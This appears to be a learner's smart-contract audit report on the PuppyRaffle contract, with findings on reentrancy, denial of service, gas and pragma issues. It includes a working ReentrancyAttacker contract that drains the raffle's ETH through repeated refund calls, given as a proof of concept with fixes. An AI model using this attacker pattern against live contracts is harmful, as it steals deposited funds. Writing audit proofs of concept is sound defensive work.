
### [H-#] There is a possible Reentrancy attack happening in `PuppyRaffle::refund`.

**Description:** In the function `PuppyRaffle::refund`, you are sending the refund to the user and after sending updating the state of the mapping which is the reason why  reentract attack can happen very easily. Remember the rule to first update the state and then execute the code or just follow CEI rule i.e. checks, effects, implementation.

```javascript

function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
@>        payable(msg.sender).sendValue(entranceFee);
@>        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }

```

**Impact:** This seems to be a very tiny bug from naked eye, but in reality an attacker can very easily wipe out all the Eth from the contract with so ease and with in seconds. In you contract when user calls the function `PuppyRaffle::refund`, first it verifies the written checks and it they gets approved the the refund is sent to the user, so when `payable(msg.sender).sendValue(entranceFee);` this line gets triggered and suppose the cantract is calling this function so this line just looks for receive or fallback function in contract and suppose if the receive or fallback says to just run the `PuppyRaffle::refund` then it just gets stuck in a loop that ends when the amount of the contract gets empty because we updated the state after sending eth.

**Proof of Concept:** The above test proves that there is a possibility of an Reentrancy attack.
Add the below code in your `PuppyRaffleTest.t.sol` file: 

<details>
<summary>Code</summary>

```javascript

function testReentrancyAttackCanHappen() external{

    address[] memory players = new address[](3);
    players[0] = address(111);
    players[1] = address(100);
    players[2] = address(200);
    puppyRaffle.enterRaffle{value: entranceFee * 3}(players);

    uint256 startingContractBalance = address(puppyRaffle).balance;
    ReentrancyAttacker ree = new ReentrancyAttacker(puppyRaffle);
    uint256 startingAttackerContractBalance = address(ree).balance;
    ree.attack{value: entranceFee}();

    uint256 endingContractBalance = address(puppyRaffle).balance;
    uint256 endingAttackerContractBalance = address(ree).balance;

    console.log("the starting balance of attacker contract is: ", startingAttackerContractBalance);
    console.log("the starting balance of contract is: ", startingContractBalance);
    console.log("the endinging balance of attacker contract is: ", endingAttackerContractBalance);
    console.log("the endinging balance of contract is: ", endingContractBalance);
    }


contract ReentrancyAttacker {

    PuppyRaffle puppy;
    uint256 fees;
    uint256 playerIndex;

    constructor(PuppyRaffle _puppy){
        puppy = _puppy;

    }

    function attack() external payable{
        address[] memory players = new address[](1);
        players[0] = address(this);
        fees = puppy.entranceFee();
        puppy.enterRaffle{value: fees}(players);
        playerIndex = puppy.getActivePlayerIndex(address(this));
        puppy.refund(playerIndex);
    }

    fallback() external payable{
        if(address(puppy).balance >= fees){
            puppy.refund(playerIndex);
        }
    }

    receive() external payable{
        if(address(puppy).balance >= fees){
            puppy.refund(playerIndex);
        }
    }
}

```

</details>


**Recommended Mitigation:** My recommendation to secure your contract from Reentrancy attack is always follow CEI (checks,effects,interactions) in your function which is sending eth. 
The change you should do in your function `PuppyRaffle::refund` is just use this line `players[playerIndex] = address(0);` before this `payable(msg.sender).sendValue(entranceFee);`. This way you can prevent your contract from Reentrancy attack.



```diff

function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        // @audit Reentrancy attack here
+       players[playerIndex] = address(0);
        payable(msg.sender).sendValue(entranceFee);

-       players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }

```



### [M-#] There can be a denial of servies (DoS) attack in the function `PuppyRaffle::enterRaffle`.

**Description:** The function `PuppyRaffle::enterRaffle` loops through the `players` to check for duplicates. Which is a issue as longer the `PuppyRaffle::players` array becomes the more it has to loop through the array and check for duplicates. This means that the gas cost for the  players who entered right after the raffle starts will be less as complared to the players entering after and after. So more the players gets added to the `PuppyRaffle::players` array the more gas will be used.

**Impact:** The gas cost for the raffle will increase as more and more players enters the raffle which will definitely give advantage to the people entering as the start of the raffle and there might be a rust of people trying to enter the raffle as the starting.

An attacker can even make the `PuppyRaffle::entrants` so big that no one else can enter and gauranteeing themselves the win.

**Proof of Concept:** The below test shows that the first 100 people entering the raffle costs a total of `6503275` gas and the next 100 people entering the raffle will cost a total of `18995515` gas which is a huge difference. 

<details>
<summary>PoC</summary>
Add this below test in your `PuppyRaffleTest.t.sol`.

```javascript

function testDosAttackPossible() external{
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for(uint256 i = 0; i < players.length; i++){
            players[i] = address(i);
        }
        uint256 startingGas = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 endingGas = gasleft();
        uint256 gasUsed = startingGas - endingGas;
        console.log("the gas used by first 100 players is", gasUsed);
        // now for the next 100 players
        address[] memory nextPlayers = new address[](100);
        for(uint256 j = 0; j < nextPlayers.length; j++){
            nextPlayers[j] = address(j+100);
        }
        uint256 startingGas2 = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * nextPlayers.length}(nextPlayers);
        uint256 endingGas2 = gasleft();
        uint256 gasUsed2 = startingGas2 - endingGas2;
        console.log("the gas used by last 100 players is", gasUsed2);
        assert(gasUsed < gasUsed2);
    }

```

</details>

**Recommended Mitigation:** The below steps are the recomendations from my side that you should follow: 

1. Instead of using a nested for loop which takes a lot of gas, you should use mapping let me show you how.

```diff

mapping(address => bool) public isAdded;

function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            // Check for duplicates
            require(!isAdded[newPlayers[i]], "PuppyRaffle: Duplicate player")
            isAdded[newPlayers[i]] = true;
            players.push(newPlayers[i]);
        }
        // @audit DOS attack:
-        for (uint256 i = 0; i < players.length - 1; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-               require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }


```

2. Allow duplicates to enter the raffle, as if any user wants to enter more than once he could just use different metamask accounts and enter from them.







# Gas

### [G-1] Some of the state variables should be marked as constant or immutable

Reading from the storage can be more gas expensive as compared to readin from constants or immutables.

Instances: 
- `PuppyRaffle::raffleDuration` should be marked as `immutable`.
- `PuppyRaffle::commonImageUri` should be marked as `constant`.
- `PuppyRaffle::rareImageUri` should be marked as `constant`.
- `PuppyRaffle::legendaryImageUri` should be marked as `constant`.


### [G-2] Function `PuppyRaffle::enterRaffle` can be marked as external instead of public

Consider using `external` instead of public in the function `PuppyRaffle::enterRaffle` as enterRaffle function in being used in the contract anywhere so marking it as external can be a good practise to save gas.


### [G-3] Storage variable in a loop should be cached

Everytime `players.length` gets called it gets read from storage, while using a variable reads from memory which is more gas efficient as of storage.

```diff
+        uint256 playersLength = players.length
-        for (uint256 i = 0; i < players.length - 1; i++) {
+         for (uint256 i = 0; i < playersLength - 1; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
+            for (uint256 j = i + 1; j < playersLength; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
  

```



### [I-1] Solidity pragma version should be specific, not wide

Consider using a specific version of solidity in your contracts instead of using wide version.
Eg: instead of using `pragma solidity ^0.7.6;` you should use `pragma solidity 0.7.6;`.



### [I-2] Solidity pragma version used should be a bit latest

Consider using a bit latest version of solidity as you have marked `pragma solidity ^0.7.6;` which is way too older, I recommend you to use more latest version of pragma solidity.



### [I-3] Missing checks for `address(0)` when assigning values to address state variables

Consider suing checks before assigning values to address because what if the address is `address(0)`.



### [I-4] 

